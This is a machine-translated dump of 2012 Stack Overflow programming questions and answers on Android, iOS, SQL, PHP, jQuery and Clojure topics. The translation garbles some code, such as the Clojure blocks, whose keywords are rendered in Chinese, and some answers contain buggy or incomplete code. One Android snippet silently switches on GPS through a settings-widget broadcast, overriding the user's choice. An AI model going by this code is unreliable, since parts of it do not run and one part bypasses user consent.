   String  selectedFromList = (String) adapter.getItem(pos);

    System.out.println("selected value >> >> >> >> >> >>"+selectedFromList);

    SelectedAnswer.setAnswer(selectedFromList);

              }

          });

}

 private void setQuestions() {

    // set the available options
    List<String> answers = currentQ.getQuestionOptions();
    System.out.println("value of the options >>>>>>>>>>>>>:"+answers); 

     //ArrayAdapter< String> myadapter = new ArrayAdapter<String>(getApplicationContext(), android.R.layout.simple_list_item_single_choice ,answers);

    //ArrayAdapter< String> adapter = new ArrayAdapter<String>(this, R.layout.quiz_questions_listitem, answers);        

             // working for the simple adapter

      adapter = new ListviewAdapter(this,answers);

     listview.setAdapter(adapter);
     //listview.setChoiceMode(ListView.CHOICE_MODE_SINGLE);
}

 } 
```

**编辑：**

```
 public class ListviewAdapter extends BaseAdapter{

public List<String> Questions;  

public Activity context;  
public LayoutInflater inflater;

public ListviewAdapter(Activity context,List<String> answers) {  
    super();  

    this.context = context;  
    this.Questions = answers;  

    this.inflater = (LayoutInflater)context.getSystemService(Context.LAYOUT_INFLATER_SERVICE);  
}  

@Override  
public int getCount() {  
    // TODO Auto-generated method stub  
    return Questions.size();  
}  

@Override  
public Object getItem(int position) {  
    // TODO Auto-generated method stub  
    return null;  
}  

@Override  
public long getItemId(int position) {  
    // TODO Auto-generated method stub  
    return 0;  
}  

public static class ViewHolder  
{  

    TextView txtquestion;  
}  

@Override  
public View getView(int position, View convertView, ViewGroup parent) {  
    // TODO Auto-generated method stub  

    ViewHolder holder;  
    if(convertView==null)  
    {  
        holder = new ViewHolder();  
        convertView = inflater.inflate(R.layout.quiz_questions_listitem, null);  

        holder.txtquestion = (TextView) convertView.findViewById(R.id.textView_option);  

        convertView.setTag(holder);  

      /*  convertView.setOnClickListener(new View.OnClickListener() {

            @Override
            public void onClick(View v) {
                // TODO Auto-generated method stub

                 System.out.println(">>>>>>>>>>>>>>>>>>>>>>>>>>"+v.toString());
                notifyDataSetChanged();

                 SelectedAnswer.setAnswer(v.toString());
            }
        });*/
    }  
    else  
        holder=(ViewHolder)convertView.getTag();  

    holder.txtquestion.setText(Questions.get(position));  

    return convertView;  
}   

} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-08T07:18:03.870

您可能`null`从`getItem()`自定义适配器的方法返回`ListviewAdapter`（您应该添加适配器的代码）。此外，无需再次设置侦听器`ListView`。

像这样修改你的`getItem()`方法：

```
@Override  
public Object getItem(int position) {     
    return Questions.get(position);  
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-08T07:17:19.150

尝试为您的列表执行此操作：

```
list.setItemsCanFocus(false); 
```

并确保列表中的项目具有属性

```
android:focusable="false"
android:focusableInTouchMode="false" 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-08T07:34:12.010

你可能选择了错误的适配器，试试这个

```
String  selectedFromList =  myAdapter.getItemAtPosition(pos).toString(); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-08T07:16:44.290

用这个

```
 public void onItemClick(AdapterView<?> myAdapter, View myView, int pos, long mylng) {

   String  selectedFromList = myAdapter.getItemAtPosition(pos);

  System.out.println("selected value >> >> >> >> >> >>"+selectedFromList);

  SelectedAnswer.setAnswer(selectedFromList);

          }

      }); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-08T07:26:33.670

尝试这样做。

```
public void onItemClick(AdapterView<?> myAdapter, View myView, int pos, long mylng) {

  //String  selectedFromList = (String) listview.getItemAtPosition(pos);

   ListviewAdapter adapter=(ListviewAdapter) listview.getAdapter();
   String  selectedFromList = (String) adapter.getItem(pos);

    System.out.println("selected value >> >> >> >> >> >>"+selectedFromList);

    SelectedAnswer.setAnswer(selectedFromList);

              }

          }); 
```

# ios - iphone：为什么我的应用内购买产品数组对象索引按字母顺序自动设置

> ID：12328805
> 
> 赞同：0
> 
> 时间：2012-09-08T07:11:56.847
> 
> 标签：ios, cocoa-touch, in-app-purchase, nsset

我正在应用程序中处理应用程序内购买任务我目前完成了所有工作，但我需要一个帮助，让我的产品数组显示在 UITableview 中并按字母顺序排序，但我需要与我的 productIdentifiers 显示相同我该怎么做这些事情请帮忙

我的问题示例如下：-

我将我的产品 productIdentifiers 设置为

```
- (id)init 
{
   NSSet *productIdentifiers = [NSSet setWithObjects:
                                   @"com.myapp.calculation.c",
                                   @"com.myapp.calculation.d",
                                   @"com.myapp.calculation.a",
                                   @"com.myapp.calculation.s",
                                   @"com.myapp.calculation.b",
                                   @"com.myapp.calculation.h",
                                   nil];

    if ((self = [super initWithProductIdentifiers:productIdentifiers])) 
    {                

    }

    return self;
} 
```

并在 tableview 数据中显示单元格字母排序，使用 a b c d h s

但我需要它与像 cdasbh 这样的 productIdentifiers 一样显示

请帮忙。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-17T09:13:58.497

扩展上面亚当的评论，如果您尝试在表格视图中显示来自集合类的数据，您应该使用数组作为数据源，而不是集合。这是因为 NSArray 中包含的对象是自动排序的，基于对象在数组中的放置方式，因此将按该顺序出现。使用 NSSet 的内容是无序的，因此会*以任何顺序*出现。

查看 Apple 的[Values and Collections](http://developer.apple.com/library/ios/documentation/cocoa/conceptual/ProgrammingWithObjectiveC/FoundationTypesandCollections/FoundationTypesandCollections.html#//apple_ref/doc/uid/TP40011210-CH7-SW11)文档，该文档详细介绍了 Cocoa 中可用的三种主要集合类类型：NSArray、NSSet 和 NSDictionary。

# algorithm - 查找两点之间的最大距离

> ID：12328807
> 
> 赞同：6
> 
> 时间：2012-09-08T07:12:08.753
> 
> 标签：algorithm, recursion, dynamic-programming, greedy, number-theory

昨天，我出现在一个采访中。我被困在一个问题中，我在这里问同样的问题。

给定一个数组，显示 x 轴上的点，有 N 个点。还赠送了M币。

```
Remember N >= M 
```

您必须最大化任意两点之间的最小距离。

```
Example: Array : 1 3 6 12
         3 coins are given.
         If you put coins on 1, 3, 6 points Then distance between coins are : 2, 3 
         So it gives 2 as answer 
         But we can improve further
         If we put coins at 1, 6, 12 points.
         Then distances are 5, 6
         So correct answer is : 5 
```

请帮助我，因为我完全陷入了这个问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T08:07:31.483

这是我的**O(N ² )**方法。首先，生成所有可能的距离；

```
int dist[1000000][3], ndist = 0;
for(int i = 0; i < n; i ++) {
    for(int j = i + 1; j < n; j ++) {
        dist[ndist][0] = abs(points[i] - points[j]);
        dist[ndist][1] = i; //save the first point
        dist[ndist][2] = j; //save the second point
    }
} 
```

现在按降序对距离进行排序：

```
sort(dist, dist + ndist, cmp); 
```

在哪里`cmp`：

```
bool cmp(int x[], int y[]) {
    return (x[0] > y[0]);
} 
```

扫描数组，只要您没有`m`选择点，就添加点：

```
int chosen = 0;
int ans;
for(int i = 0; i < ndist; i ++) {
    int whatadd = (!visited[dist[i][1]]) + (!visited[dist[i][2]); //how many new points we'll get if we take this one
    if(chosen + whatadd > m) {
        break;
    }
    visited[dist[i][1]] = 1;
    visited[dist[i][2]] = 1;
    chosen += whatadd;
    ans = dist[i][0]; //ans is the last dist[i][0] chosen, since they're sorted in decreasing order
}
if(chosen != m) {
    //you need at most one extra point, choose the optimal available one
    //left as an exercise :)
} 
```

我希望这有帮助！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-08T07:17:47.840

您可以使用 greyy 算法：您选择有序系列的第一个和最后一个点（因为这是可能的最大距离）。然后你选择最接近它们平均值的点（因为任何其他答案都会在一侧给出更小的距离），而不是选择更大的分区。然后根据需要重复多次。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-09-08T07:30:18.380

您必须使用动态编程。因为，您需要一个最佳答案。您的问题类似于“**硬币的变化**”问题。像这个问题一样，你没有硬币，你想找到最小距离。（而不是最小的硬币）。

您可以阅读以下链接：[Change Coin problem](http://en.wikipedia.org/wiki/Change-making_problem) & [Dynamic Programming](http://en.wikipedia.org/wiki/Dynamic_programming)

# php - 如何在 PHP Zend 应用程序中使用 SSRS 报告？

> ID：12328808
> 
> 赞同：0
> 
> 时间：2012-09-08T07:12:09.173
> 
> 标签：php, sql-server, reporting-services

我们在 Zend PHP Framework 和 MSSQL As DB 中有应用程序。我们需要使用**SSRS Reports**进行报告功能。

我们已经设置了报告服务器，我们还使用报告设计器上传了 rdp 文件并运行它，它使用用户 ID 和密码并显示报告。

1.我们想要的是如何将 rdp 报告呈现给我们的应用程序？

[任何在 PHP 中使用过 SSRS 的朋友吗？]

提前致谢 ！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-11T06:47:13.880

阅读您的评论，我认为您的登录凭据或服务 URL 可能存在问题。确保您在代码中使用的是 WEB 服务 URL，而不是虚拟目录路径。

# iphone - 如何从合适的视图中将选定的单元格值显示为其他视图中的标签

> ID：12328811
> 
> 赞同：3
> 
> 时间：2012-09-08T07:12:55.690
> 
> 标签：iphone, ios, uitableview

我是 iphone 开发新手。我有一个 tableview 控制器，我想在其他视图中将选定（多个）单元格（选中标记）值显示为标签，我怎样才能做到这一点？这是我用来检查标记 tableview 单元格的代码

```
- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath
{

UITableViewCell *thisCell = [tableView cellForRowAtIndexPath:indexPath];
if (thisCell.accessoryType == UITableViewCellAccessoryNone) {
    thisCell.accessoryType = UITableViewCellAccessoryCheckmark;

}else
{
    thisCell.accessoryType = UITableViewCellAccessoryNone;
}
}
- (UITableViewCellAccessoryType)tableView:(UITableView *)tableView accessoryTypeForRowWithIndexPath:(NSIndexPath *)indexPath {
return UITableViewCellAccessoryNone;
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-08T07:31:21.130

在数组中添加选中标记单元格的索引并在标签中显示该索引处的值

```
- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath
{
    UITableViewCell *thisCell = [tableView cellForRowAtIndexPath:indexPath];
    if (thisCell.accessoryType == UITableViewCellAccessoryNone) {
        thisCell.accessoryType = UITableViewCellAccessoryCheckmark;
        [myIndexArray addObject:[NSString stringWithFormat:@"%d",indexPath.row]];
    }
    else
    {
        thisCell.accessoryType = UITableViewCellAccessoryNone;
        for(int i=0; i<myIndexArray.count; i++)
        {
            if([[myIndexArray objectAtIndex:i]intValue]== indexPath.row)
            {
                [myIndexArray removeObjectAtIndex:i];
                 break;
            }
        }
    }
} 
```

# javascript - 在 IE、Jquery 中不显示或选择或打印的隐藏文本

> ID：12328815
> 
> 赞同：2
> 
> 时间：2012-09-08T07:14:08.910
> 
> 标签：javascript, jquery, css

HTML：

```
<button id="hide_some_text">Hide</button>
<div id="first">my name is Sea Mist and iam 19 years old</div>
<div id="second" style="display: none">This is the hidden text to be printed and selected only when button is pressed</div> 
```

查询：

```
$("#hide_some_text").click(function(){
$("#second").toggle();
}); 
```

我想要的是 ：

如果 div 标签“second”下的文本仅可见，那么它应该是 SELECTED 和 PRINTABLE（请注意我在 IE 中工作），如果 div 标签“second”下的文本是隐藏的，那么当我执行 Ctrl+A 时它不应该被 SELECTED -> Ctrl + V，当我去打印预览时也不应该显示

注意：我使用 IE，这些问题不会出现在 mozzila 或 chrome 中，但由于限制我必须使用 IE，所以我需要一个特定于 IE 的解决方案

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-08T07:20:04.450

在你的 JavaScript 中做这样的事情：

```
var cache;
$("#hide_some_text").click(function(){
    if($("#second").is(":visible")) { //if it's not hidden
        cache = $("#second").html(); //cache the HTML
        $("#second").hide().html(""); //hide and empty HTML
    }
    else { //else, it's hidden
        $("#second").show().html(cache); //show and get back HTML
    }
});
$(document).ready(function() {
    $("#hide_some_text").click();
}); 
```

# postgresql - Postgres：如何将 int 时间戳格式化为可读日期字符串？

> ID：12328817
> 
> 赞同：16
> 
> 时间：2012-09-08T07:14:14.850
> 
> 标签：postgresql

[假设我有一列包含 unix 时间戳 - 一个 int 表示自epoch](https://en.wikipedia.org/wiki/Unix_time)以来的秒数。它们看起来像这样：`1347085827`。如何在我的 SELECT 查询中将其格式化为人类可读的日期字符串？

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2012-09-08T07:14:14.850

Postgresql 有一个方便的内置函数：`to_timestamp()`. 只需将该函数包装在您想要的列周围：

```
Select a, b, to_timestamp(date_int) FROM t_tablename 
```

# android - 如果找不到位置，GPS 不会关闭

> ID：12328819
> 
> 赞同：0
> 
> 时间：2012-09-08T07:14:24.560
> 
> 标签：android

如果在第一个实例中找不到位置，我应该怎么做才能关闭 gps..没有调用位置更新

```
package mobile.sales;

import java.text.SimpleDateFormat;
import java.util.Date;
import android.app.Activity;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;

public class test extends Activity 
{
     DataSource dataSource;
     Double lat=0.0,lng=0.0;
     String GPS_FILTER = "";
     Thread triggerService;
     LocationListener locationListener;
     LocationManager lm;
     private static final long MINIMUM_DISTANCE_CHANGE_FOR_UPDATES = 1000; // in Meters
     private static final long MINIMUM_TIME_BETWEEN_UPDATES = 29*1000*60; // in Milliseconds
     protected LocationManager locationManager;
     boolean isRunning = true;
     NotificationManager notificationManager;
     PendingIntent contentIntent;
     Notification notification;

     @Override
     protected void onCreate(Bundle savedInstanceState) {
        // TODO Auto-generated method stub
        super.onCreate(savedInstanceState);
        turnGPSOn();
        LocationManager locationManager = (LocationManager)getSystemService(Context.LOCATION_SERVICE);
        locationListener = new MyLocationListener();
        locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER,MINIMUM_TIME_BETWEEN_UPDATES, MINIMUM_DISTANCE_CHANGE_FOR_UPDATES, locationListener);
    }

     @Override
     public void onDestroy() 
     {
         // TODO Auto-generated method stub
         locationManager.removeUpdates(locationListener);
         locationManager= null;
         turnGPSOnOff();  
         super.onDestroy();
         // removeGpsListener();
     }

     private class MyLocationListener implements LocationListener
     {
        public void onLocationChanged(Location location) 
         {
            lat=location.getLatitude();
            lng=location.getLongitude();
            turnGPSOnOff();
            SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy");
            String currentDateandTime = sdf.format(new Date());     
            SimpleDateFormat sdft = new SimpleDateFormat("hh:mm:ss");
            String time=sdft.format(new Date());
            dataSource.insertIntoLocationDetails(""+lat,""+lng,currentDateandTime,""+time);
            Log.d("service","location Inserted");
         }

         public void onStatusChanged(String s, int i, Bundle b) {

         }

         public void onProviderDisabled(String s) {
         }

         public void onProviderEnabled(String s) {
         }
     }
     private void turnGPSOnOff(){
         Intent intent = new Intent("android.location.GPS_ENABLED_CHANGE");
         intent.putExtra("enabled", false);
         sendBroadcast(intent);
     }
     private void turnGPSOn(){
            String provider = Settings.Secure.getString(getContentResolver(), Settings.Secure.LOCATION_PROVIDERS_ALLOWED);
            if(!provider.contains("gps")){
                final Intent poke = new Intent();
                poke.setClassName("com.android.settings","com.android.settings.widget.SettingsAppWidgetProvider");
                poke.addCategory(Intent.CATEGORY_ALTERNATIVE);
                poke.setData(Uri.parse("3"));
                sendBroadcast(poke);
            }
     }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-08T07:31:56.490

You are calling the function when you are trying to `DESTROY` The activity itself. First find the Fix of GPS using [GPSStatusListener](http://developer.android.com/reference/android/location/GpsStatus.Listener.html)

Use this code

[Check Gps Status](https://stackoverflow.com/questions/2021176/how-can-i-check-the-current-status-of-the-gps-receiver)

Call your `GpsTurnOff` status in `GPSStatusListener`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-08T08:03:14.413

new Handler().postDelayed(new Runnable() { @Override public void run() { turnGPSOnOff(); } }, 2000*60); 这将在一段时间后关闭我的 GPS

# directory - Octopress的目录结构

> ID：12328828
> 
> 赞同：6
> 
> 时间：2012-09-08T07:15:57.370
> 
> 标签：directory, blogs, octopress

我想了解 Octopress 的整个目录结构。每个文件夹以及它们如何组合在一起。无法在线找到任何文档。

例如：public 和 _deploy 文件夹有什么区别？

帮助和指针将不胜感激。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-09-10T16:31:04.800

# openldap - LDAP 最大用户数

> ID：12328830
> 
> 赞同：2
> 
> 时间：2012-09-08T07:15:58.033
> 
> 标签：openldap

我有一个 LDAP 服务器，用于管理来自多个应用程序（Web 和桌面）的唯一访问点的用户。现在我需要在一个 OU（组织单位）中导入超过 20 万个条目，这个数字甚至会增长。我的问题是：有关于 ldap 服务器可以处理的最大用户数的建议吗？一个OU能容纳这么多用户吗？

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-09T06:32:32.803

当我们谈论 200K 条目时，我认为 LDAP 服务的性能将取决于您的服务器和网络资源，而不是 LDAP 技术。但我认为这样的数据量确实没有问题。

为了向您的用户提供更好的性能，您应该牢记（当您设计项目并决定将哪些数据放入 LDAP 时）规则 1:10K（1 次写入：10,000 次读取），因为 LDAP 的设计速度非常快因为写起来很慢，所以改读。你也可以考虑使用多个实例，在它们前面有复制和负载均衡器（如果你需要更多细节，我可以提供）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-08T08:31:19.113

如果您正确设置索引，OpenLDAP 应该能够处理数百万用户。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-09T22:09:22.287

我已经运行 eDirectory 作为 LDAP 服务的底层数据存储，在一个 OU 中有 600,000 个对象，有 200 万个，我知道一家电信公司拥有超过 800 万个。

# jquery - 为什么if / elseif语句不起作用jquery

> ID：12328832
> 
> 赞同：1
> 
> 时间：2012-09-08T07:16:00.750
> 
> 标签：jquery, if-statement, click

对不起，如果这是重复但找不到任何相同的东西...

我无法让 if else 语句起作用。我完成了第一部分，但第二部分不会。目的是单击 div 并展开，然后再次单击时缩小。

```
$(document).ready(function(){
    if($(".back2").css("height") < "51px")
    {
        $(".back2").click(function()
        {
            $(".back2_img,.back2").css({"height":"200px"}, 'slow'); 
        });
    }
    ElseIf($(".back2").css("height") >"55px")
    {
        $(".back2").click(function()
        {
            $(".back2,.back2_img").css({"height":"50px"}, 'slow');
        });
    };
}); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-08T07:19:28.790

正确的语法是`else if`：

```
if (condition) {
    //code
}
else if (condition) {
    //code
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-08T07:21:07.947

我已经整理了你的代码，也不`else if`是`ElseIf`。
您的其中一个`;`. （不一定是代码破坏错误，而只是保持 100% 一致的好习惯，请参阅评论以获取更多信息）。

正确的代码嵌套将为您节省数小时的头痛！

```
$(document).ready(function() {
    if ($(".back2").css("height") < "51px") {
        $(".back2").click(function() {
            $(".back2_img,.back2").css({
                "height": "200px"
            }, 'slow');
        });
    }
    else if($(".back2").css("height") > "55px") {
        $(".back2").click(function() {
            $(".back2,.back2_img").css({
                "height": "50px"
            }, 'slow');
        });
    }
});​ 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-08T07:22:23.763

它是“else if”而不是“ElseIf”，javascript 是一种区分大小写的语言。请用嵌套样式写！看在上帝的份上...拜托，这对你和其他人都有好处。像这样：

```
$(document)
.ready(
    function(){
        if ($(".back2").css("height") < "51px")
        {
            $(".back2")
            .click(
                function()
                {
                    $(".back2_img,.back2")
                    .css(
                        {"height":"200px"}, 
                        'slow'
                    );
                }
            );
        }
        else if ($(".back2").css("height") >"55px") {
            $(".back2")
            .click(
                function()
                {
                    $(".back2,.back2_img")
                    .css(
                        {"height":"50px"}, 
                        'slow'
                    );
                }
            );
         };
    }
); 
```

# objective-c - 多个 NSURLConnection 运行后台

> ID：12328834
> 
> 赞同：0
> 
> 时间：2012-09-08T07:16:38.340
> 
> 标签：objective-c, xcode, ipad, nsurlconnection

我正在尝试`NSUrlConnection`使用线程概念同时发送多个。我也在尝试处理`connection`代表。

我尝试发送重复请求，但我不知道如何处理接收到的数据。有没有关于这个倍数的任何文件`NSURLConnection.`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T08:48:42.417

用于`sendAsynchronousRequest:queue:completionHandler:`在后台发送请求并使用完成处理程序对完成的处理程序作出反应。这将允许您同时发送尽可能多的请求。

有关 NSURLConnection 的文档，请查看官方[Apple Class Reference 和 Samples](https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/NSURLConnection_Class/Reference/Reference.html)。

我还建议您看看[ASIHTTPRequest](http://allseeing-i.com/ASIHTTPRequest/)或[MKNetworkKit](http://blog.mugunthkumar.com/products/ios-framework-introducing-mknetworkkit/)。两者都是支持您创建 HTTP 请求的库，但有很多有用的附加功能并且更易于使用。

# c# - 如何为 VB 脚本公开和操作 C# 运行时对象？

> ID：12328835
> 
> 赞同：0
> 
> 时间：2012-09-08T07:16:41.317
> 
> 标签：c#, object, vbscript, runtime

我正在尝试用 C# 制作一个从串行端口实时读取数据的应用程序。然后，应用程序将允许用户通过 VB 脚本来操作这些数据。用户应该能够编写一个 VBScript 来为自己的目的操作这些数据。这样的 VB 语句类似于：

```
If CurrentTime = 12 then Stream.CurrentValue = 10
If CurrentTime = 1 then Stream.Enabled = False 
```

是否可以在运行时通过 VB 脚本公开和操作 C# 对象？

有人可以指出我如何做到这一点的正确方向吗？

# sql - 日期时间中的批量插入数据类型不匹配

> ID：12328841
> 
> 赞同：0
> 
> 时间：2012-09-08T07:17:17.487
> 
> 标签：sql, sql-server, bulkinsert

在我的批量插入查询中，我将 .LST 文件中的一列作为 |12083121022612| 此列的格式如`"YYMMDDHHMMSSTT"`表`dbo.ReportMain`中所示，我为此设置了数据类型，因为`datetime` 它给了我错误提示

> 第 1 行第 13 列 (DateAndTime) 的批量加载数据转换错误（指定代码页的类型不匹配或无效字符）。

批量插入代码：-

```
BULK
INSERT dbo.ReportMain
FROM 'C:\AGS_WINCORE_120901.LST'
WITH
(
FIELDTERMINATOR = '|',
ROWTERMINATOR = '0x0A'
)
GO 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-08T11:04:37.407

好吧，`12083121022612`这不是一个有效的日期：

```
select cast('12083121022612' as datetime)
-->
Conversion failed when converting date and/or time from character string. 
```

您可以批量加载到使用`varchar`字段的临时表中。您可以将该`varchar`字段转换为通用`yyyy-MM-ddTHH:mm:ss:tt`日期格式。这是一个示例查询，它可以将暂存表中的行插入到主表中：

```
insert  ReportMain
        (col1)
select  cast('20' + substring(col1,1,2) + '-' + substring(col1,3,2) + '-' + 
            substring(col1,5,2) + 'T' + substring(col1, 7,2) + ':' + 
            substring(col1, 9,2) + ':' + substring(col1, 11,2) + 
            '.' + substring(col1, 13,2) as datetime)
from    ReportMain_Staging 
```

[SQL Fiddle 的示例。](http://sqlfiddle.com/#!6/d41d8/226/0)

# php - 会话无法在 chrome 中工作并在 Firefox 中工作

> ID：12328845
> 
> 赞同：2
> 
> 时间：2012-09-08T07:17:52.727
> 
> 标签：php, session, session-variables, session-cookies, sessionid

我的会话不能在 chrome 和 safari 浏览器中运行，也不能在 Firefox 中运行。谁能解释为什么会这样？

```
 <?php
  session_start();

 $sessionuser=$_SESSION['user'];

 ?> 
```

如果我`print_r($sessionuser)`不能在 chrome 或 safari 浏览器中工作，但在 Firefox 中工作

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-19T07:07:04.750

您必须检查您的浏览器 cookie。您的会话不是一组如果 cookie 被禁用。您必须进入浏览器设置并检查 cookie 设置。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-08T07:21:33.967

```
$sessionuser = $_SESSION['user']; 
```

没有引号 + 分号

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-08T07:24:37.023

我想说的是，除了您的代码有解析错误之外，您必须在使用`session_start();`之前使用`$_SESSION[]`

可能是您忘记了 Firefox 中的旧会话 cookie。我认为可以用萤火虫检查这一点。

还要检查 da5id 的答案，它会修复解析错误。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-08T07:24:43.107

尝试这个

```
session_start();

$sessionuser=$_SESSION['user'];

echo $sessionuser; 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-08T07:39:51.633

尝试以下。它适用于我在 LINUX 中的 chrome。

```
session_start();
$_SESSION['user'] = "hithere";
$sessionuser=$_SESSION['user'];
print_r($sessionuser); 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2017-07-02T14:07:29.107

## 试试看嘛

就我而言，我只是***重置 chrome 浏览器***

转到 chrome://settings/ 然后单击高级然后重置

# clojure - ring 在哪里获取表单的 wrap-params 信息？

> ID：12328847
> 
> 赞同：1
> 
> 时间：2012-09-08T07:18:15.033
> 
> 标签：clojure, ring

我正在尝试更深入地研究 ring 并使用以下代码来查看请求映射中发生了什么：

```
（需要'[ring.adapter.jetty :as serv]）
（需要'[ring.middleware.params :as wp]）

（定义基本处理程序 [参数]
  {：代码 200
   ：输入“txt/html”
   :body (str 参数)})

(defn wp-handler [参数]
  ((wp/wrap-params base-handler) params))

(serv/run-jetty #'wp-handler {:port 8099})

```

* * *

当我想查看`get`请求图上的查询数据时，它就在那里。假设我在`http://localhost:8099/api/tasks/remove?hello=3`浏览器中输入，响应看起来像这样：

```
{:ssl-client-cert 无，
 ：远程地址“127.0.0.1”，
 ：方案：http，
 :request-method :get,
 :uri "/api/tasks/remove"
 ：查询字符串“你好=3”
  .... 更多的 ....}

```

您可以看到“hello=3”在查询字符串中。

* * *

但是对于`post`，响应有 :content-type `"application/x-www-form-urlencoded"`，整个响应看起来像下面这个例子，我没有看到任何表单参数：

```
{:ssl-client-cert nil, :remote-addr "127.0.0.1", :scheme :http, :request-method :post, :query-string nil, :content-type "application/x-www-form- urlencoded", :uri "/api/tasks/remove", :server-name "localhost", :headers {"user-agent" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11", "origin" "http://localhost:8099", "accept-charset" "ISO-8859-1,utf-8;q=0.7,*;q=0.3 ", "接受" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "host" "localhost:8099", "referer" "http:// localhost:8099/form.html", "content-type" "application/x-www-form-urlencoded", "cache-control" "max-age=0", "accept-encoding" "gzip,deflate,sdch", "content-length" "23", "accept-language" "en-US,en;q=0.8", "connection" " keep-alive"}, :content-length 23, :server-port 8099, :character-encoding nil, :body #}

```

* * *

我的问题分为两部分：

1.  提交表单时 ring 或 jetty 到底在做什么？
2.  如果我正在尝试编写自己的`handler`代码来处理表单数据，那么我如何访问表单查询参数的简化代码框架是什么？

* * *

我已经将这个函数的“魔力”隔离在`params.clj`：

```
(defn- assoc-form-params
  "Parse and assoc parameters from the request body with the request."
  [request encoding]
  (merge-with merge request
    (if-let [body (and (urlencoded-form? request) (:body request))]
      (let [params (parse-params (slurp body :encoding encoding) encoding)]
        {:form-params params, :params params})
      {:form-params {}, :params {}}))) 
```

特别是这一行：

`(parse-params (slurp body :encoding encoding) encoding)`

但我不确定它在做什么。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-08T20:10:08.427

从[urlencode-form 的源代码来看？](https://github.com/mmcgrana/ring/blob/master/ring-core/src/ring/middleware/params.clj#L18)parse-params 永远不会被调用，因为您的请求是 application/x-www-form-urlencoded。请[在此处](http://www.w3.org/TR/html401/interact/forms.html#h-17.13.4.1)查看请求类型的描述。

你如何发送**post**请求？据我了解，参数是以**multipart/form-data**模式发送的，但请求本身被标记为**application/x-www-form-urlencoded**。

# sql - 查询以水平显示输出

> ID：12328849
> 
> 赞同：4
> 
> 时间：2012-09-08T07:18:31.813
> 
> 标签：sql, oracle, pivot

我需要以水平方式显示查询输出。我有一些示例数据

```
create table TestTable (id number, name varchar2(10))

insert into TestTable values (1, 'John')
insert into TestTable values (2, 'Mckensy')
insert into TestTable values (3, 'Valneech')
insert into TestTable values (4, 'Zeebra')

commit

select * from TestTable 
```

这将在垂直视图中获得输出。

```
ID Name
==========
1  John
2  Mckensy
3  Valneech
4  Zeebra 
```

但是，我需要水平显示它。

```
ID   1    2       3        4
Name John Mckensy Valneech Zeebra 
```

怎么能做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-08T07:40:52.513

要进行数据透视，您应该使用select 语句的[数据透视子句：](http://docs.oracle.com/cd/E11882_01/server.112/e26088/statements_10002.htm#CHDFAFIE)

```
select *
  from testtable
 pivot ( max(name)
         for id in (1,2,3,4)
       ) 
```

这在 SQL 中并不是特别漂亮，因此您应该仔细考虑这是否是您想要做的。我通常使用[Oracle Base](http://www.oracle-base.com/articles/11g/pivot-and-unpivot-operators-11gr1.php)来旋转示例，但那里有很多。

这是一个小[SQL Fiddle](http://www.sqlfiddle.com/#!4/de90e/2)来演示。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-08T07:36:34.803

也许它会帮助你：

```
select 'id', LISTAGG(id, ' ') WITHIN GROUP (ORDER BY name)      
from testtable
union 
select 'name', LISTAGG(name, ' ') WITHIN GROUP (ORDER BY name)
from testtable 
```

编辑：

或使用枢轴：

```
create table TestTable2 (id varchar2(30), name varchar2(10));

insert into TestTable2 values ('id', 'name');

insert into TestTable2
select cast(id as varchar2(30)) as id , name
from testtable

  select *
    from testtable2
    pivot (  max(name)
             for id in ('id',1,2,3,4) 
) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-08T07:36:08.173

[PIVOT](http://www.oracle-base.com/articles/11g/pivot-and-unpivot-operators-11gr1.php)运算符是您正在寻找的。

# struts2 - 如何创建 Java Web 应用程序的可执行文件或设置文件

> ID：12328852
> 
> 赞同：2
